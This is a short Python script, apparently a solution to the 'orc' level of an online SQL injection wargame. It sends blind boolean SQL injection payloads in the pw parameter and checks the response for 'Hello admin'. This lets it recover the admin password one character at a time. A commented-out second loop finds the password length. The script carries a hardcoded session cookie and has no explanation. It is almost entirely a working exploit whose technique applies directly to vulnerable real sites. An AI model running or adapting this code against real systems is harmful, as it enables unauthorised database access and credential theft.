import urllib.parse as urllib
import urllib.request as urllib2
import sys
import time
 
string = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$^&*()-_+="
key = ""
 
for i in range(1, 9):
    for j in range(len(string)):
        payload = "1' or '1'='1' and(substring(pw," + str(i) + ",1)='" + string[j] + "')#"
        payload = urllib.quote(payload)
        url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="+payload

        opener = urllib2.build_opener(urllib2.HTTPHandler)
        request = urllib2.Request(url)
        request.add_header('Cookie', 'PHPSESSID=4e5ru6s8i2ekuffjc31pvk8dhe')
        request.get_method = lambda:'GET'
        data = opener.open(request)
        data = data.read()

        if bytes("Hello admin", 'utf-8') in data:
            key += string[j]
            break
        else:
            print("Testing with i, j: ", i, j)
        
        time.sleep(0.2)

    print("Reached i: ", i)
 
print(key)

# for i in range(1, 30):
#     payload = "1' or '1'='1' and(length(pw)=" + str(i) + ")and'1'='1"
#     payload = urllib.quote(payload)
#     url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="+payload

#     opener = urllib2.build_opener(urllib2.HTTPHandler)
#     request = urllib2.Request(url)
#     request.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36')
#     request.add_header('Cookie', 'PHPSESSID=4e5ru6s8i2ekuffjc31pvk8dhe')
#     request.get_method = lambda:'GET'
#     data = opener.open(request)
#     data = data.read()

#     if bytes("Hello admin", 'utf-8') in data:
#         print("len: ", i)
#         # break
#     else: 
#         print("check with i = ", i)

#     time.sleep(0.2)

 